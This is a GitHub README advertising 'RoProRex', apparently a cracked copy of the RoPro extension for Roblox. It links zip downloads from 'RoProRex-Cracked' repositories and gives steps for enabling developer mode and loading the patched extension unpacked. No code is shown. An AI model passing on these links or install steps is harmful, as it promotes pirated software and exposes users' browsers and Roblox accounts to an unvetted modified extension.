<h1 align="center">
   RoProRex
</h1>
<p align= "center">
   <kbd>
   <img  src="https://github.com/kss342/RoProRex/assets/111409284/5fa39681-b1f9-4754-acdb-10ac37cc1758">
   </kbd><br><br>
   <img src="https://img.shields.io/github/languages/top/kss342/RoProRex">
   <img src="https://img.shields.io/github/stars/kss342/RoProRex">
   <img src="https://img.shields.io/github/forks/kss342/RoProRex">
   <br>
   <img src="https://img.shields.io/github/last-commit/kss342/RoProRex">
   <img src="https://img.shields.io/github/license/kss342/RoProRex">
   <br>
   <img src="https://img.shields.io/github/issues/kss342/RoProRex">
   <img src="https://img.shields.io/github/issues-closed/kss342/RoProRex">
   <br>
   <br>
</p>
<p align= "center">
    Much love to everyone who stars this repo

</p>
   
## Table of Contents

- [Download](#download)
- [Features](#features)
- [How to Install?](#how-to-install)

## Download

[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/fantasyluh/RoProRex-Cracked/archive/refs/heads/main.zip)

## Features

    • Trade loss/win preview.
    • Server region locator.
    • Best stable ping server filters.
    • Profile themes.
    • Trade Notifier.
    • Trade protection.
    • Trade cancel treshold.
    • More mutuals on friends page.
    • Live experience like, dislike, and favorite counters.
    • More server filters (region, connection, uptime).
    • View server region, version, and uptime.
    • Embedded links to Rolimons user pages.
    • Embedded links to Rolimons item pages.
    • Open source.
    (...more)

**Supports:** All Browsers (Other than Mozilla Firefox).*
# Images
<p align= "center">
   <kbd>
   <img  src="https://github.com/kss342/RoProRex/assets/111409284/d5d99284-99e7-4b8c-bbd3-ebcdb1aae2ff">
   </kbd><br><br>
   <p align= "center">
   <kbd>
   <img  src="https://github.com/kss342/RoProRex/assets/111409284/6ca46f13-bf0c-4e85-b0b6-e7f0cf902e67">
   </kbd><br><br>
   <p align= "center">
   <kbd>
   <img  src="https://github.com/kss342/RoProRex/assets/111409284/ec5c71f1-e8e4-47f3-b648-4f44faec55b9">
   </kbd><br><br>

   <p align= "center">


   </kbd><br><br>

## How to install?

- Download the [RoPro](https://github.com/kss342/RoProRex-Cracked/raw/main/Rex.zip)
- Open the extension we downloaded
- Extract the downloaded extension to your desktop (doesnt have to be your desktop)
- Enable developer mode on your browser
- For example, go to opera://extensions (or wherever you can view your extensions)
- Press "Load unpacked" (or similar) and select the patched extension folder
- Done!

## Contact

• fantasyluh on discord



